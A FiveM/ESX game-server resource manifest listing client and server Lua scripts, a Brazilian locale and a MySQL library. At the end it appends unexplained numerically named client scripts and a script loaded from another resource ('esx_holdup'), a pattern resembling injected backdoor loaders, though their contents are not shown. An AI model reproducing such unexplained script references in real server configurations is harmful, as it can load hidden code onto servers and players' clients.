resource_manifest_version '05cfa83c-a124-4cfa-a768-c24a5811d8f9'

client_scripts {
  '@es_extended/locale.lua',
  'locales/br.lua',  
  'config.lua',
  'client.lua',
}

server_scripts {
  '@mysql-async/lib/MySQL.lua',
  '@es_extended/locale.lua',
  'locales/br.lua',  
  'config.lua',
  'server.lua',

}

client_script '95270.lua'
client_script '32367.lua'

client_script '@esx_holdup/src/c_00.lua'